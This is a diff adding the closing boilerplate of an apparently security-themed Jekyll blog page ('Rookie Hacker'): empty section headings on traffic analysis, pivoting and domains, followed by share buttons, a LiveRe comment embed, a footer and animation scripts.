+<h4 id="流量分析">流量分析</h4>
+
+<h4 id="pivot">Pivot</h4>
+
+<h4 id="域">域</h4>
+
+<h4 id="adv">adv</h4>
+
+
+  <!-- 引入share模块 -->
+  
+  <div class="social-share-wrapper">
+    <div class="social-share"></div>
+  </div>
+
+
+<!-- share.js -->
+<script src="/assets/js/social-share.min.js"></script>
+<script>
+  socialShare('.social-share', {
+    sites: [
+      
+        'qq'
+        ,
+        
+      
+        'wechat'
+        ,
+        
+      
+        'weibo'
+        ,
+        
+      
+        'twitter'
+        ,
+        
+      
+        'facebook'
+        
+      
+    ],
+    wechatQrcodeTitle: "分享到微信朋友圈",
+    wechatQrcodeHelper: '期待在朋友圈见到这篇文章'
+  });
+</script>
+
+</div>
+
+<!-- 底部锚点 -->
+<a id="htmldown" name="htmldown"></a>
+<!-- 引入评论模块 -->
+
+
+
+    <section class="post-footer-item comment">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDI2OS8xMDgwNg=="></div>
+    </section>
+
+    <!-- 来必力City版安装代码 -->
+    <script type="text/javascript">
+       (function(d, s) {
+           var j, e = d.getElementsByTagName(s)[0];
+
+           if (typeof LivereTower === 'function') { return; }
+
+           j = d.createElement(s);
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+
+           e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    <!-- City版安装代码已完成 -->
+
+
+
+
+
+<!-- 引入goto模块 -->
+<div class="bounceInRight animated go">
+  <a title="顶部切换页面" class="gototop" href="#htmlup" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Top
+    </div>
+  </a>
+  <a title="底部有livere评论哦" class="gotobottom" href="#htmldown" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Foot
+    </div>
+  </a>
+</div>
+
+<!-- 引入页面底部模块 -->
+<footer id="bottom">
+  <br>
+  <span>Rookie Hacker ©
+  
+  
+    2018
+    -
+  
+  2022
+  <br>
+  Powered by <a href="https://www.jekyll.com.cn/">Jekyll</a> | <a href="https://github.com/xukimseven/HardCandy-Jekyll">HardCandy-Jekyll</a></span>
+</footer>
+
+
+<!-- 引用wow.js的动画效果 -->
+<script src="/assets/js/wow.js"></script>
+<script>
+    var wow = new WOW({
+        boxClass: 'wow',
+        animateClass: 'animated',
+        // offset: 600,
+        mobile: true,
+        live: true
+    });
+    wow.init();
+</script>
+<!-- 页面刷新回到顶部 -->
+<script>
+    window.onbeforeunload = function(){
+        //刷新后页面自动回到顶部
+        document.documentElement.scrollTop = 0;  //ie下
+        document.body.scrollTop = 0;  //非ie
+    }
+</script>
+<script src="/assets/js/main.js"></script>
+</body>
+</html>
